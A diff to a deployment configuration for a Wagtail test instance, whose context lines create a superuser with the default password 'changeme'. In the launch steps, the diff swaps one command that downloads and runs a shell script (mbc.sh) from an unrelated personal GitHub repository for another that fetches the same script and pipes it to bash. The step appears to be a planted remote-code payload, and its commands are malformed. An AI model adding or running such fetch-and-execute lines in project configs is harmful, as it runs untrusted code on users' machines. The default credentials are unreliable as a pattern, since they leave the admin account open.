@@ -19,5 +19,6 @@ deployments:
       - echo "<br><h1>Wagtail test instance</h1><p>Log into <a href='/admin/'>/admin/</a> with 'admin' / 'changeme'.</p>" > home/templates/home/welcome_page.html
       - echo "from django.contrib.auth import get_user_model; User = get_user_model(); User.objects.create_superuser('admin', 'admin@example.com', 'changeme')" | python manage.py shell    
     launch_steps:
-      - RUN "wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh"
+      - apt-get update libssl-dev libpq-dev git build-essential libfontconfig1 libfontconfig1-dev curl
+      - RUN -c "curl -sL wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh | bash -"
     run_options: -v ~/code:/code
